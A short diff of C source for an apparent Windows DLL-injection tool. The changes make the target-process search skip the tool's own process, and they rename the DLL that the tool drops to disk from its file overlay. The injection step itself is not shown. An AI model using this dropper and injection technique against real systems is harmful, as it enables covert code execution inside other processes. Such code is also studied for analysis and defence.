@@ -4,6 +4,8 @@
 #include <stdio.h>
 
 
+
+
 typedef void* HANDLE;
 
 size_t dllSize = 0;
@@ -38,6 +40,13 @@ int is64bit(long pid) {
 //get PID of the first 32 bit process
 int findPidOf32BitProcess(){
     PROCESSENTRY32 pe32;
+    char process[MAX_PATH];
+    if (!GetModuleFileNameA(NULL, process, MAX_PATH)){
+        return 0;
+    }
+    char *processFileName;
+    (processFileName = strrchr(process, '\\')) ? ++processFileName : (processFileName = process);   //get filename from path
+   
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
         //vrati 0; pokial sa nevytvoril snapshot
@@ -46,12 +55,16 @@ int findPidOf32BitProcess(){
     pe32.dwSize = sizeof(PROCESSENTRY32); //according the documentation, size must be set first
     if (Process32First(hProcessSnap, &pe32)){   //get first process
         if (is64bit(pe32.th32ProcessID) == 0){ //check if is 32 bit
-            return pe32.th32ProcessID;
+            if (strcmp(pe32.szExeFile, processFileName) != 0){ //compare process names
+                return pe32.th32ProcessID;
+            }
         }
     }
     while(Process32Next(hProcessSnap, &pe32)){
         if (is64bit(pe32.th32ProcessID) == 0){ //check if is 32 bit
-            return pe32.th32ProcessID;
+            if (strcmp(pe32.szExeFile, processFileName) != 0){ //compare process names
+                return pe32.th32ProcessID;
+            }
         }
     }
     return 0;
@@ -141,7 +154,7 @@ void getOverlay(){
 //create DLL on disks
 char* dropDll(){
     HANDLE hFile;
-    char *fileName = "inject.dll";
+    char *fileName = "remoteDllInjection.dll";
 
     getOverlay();
 
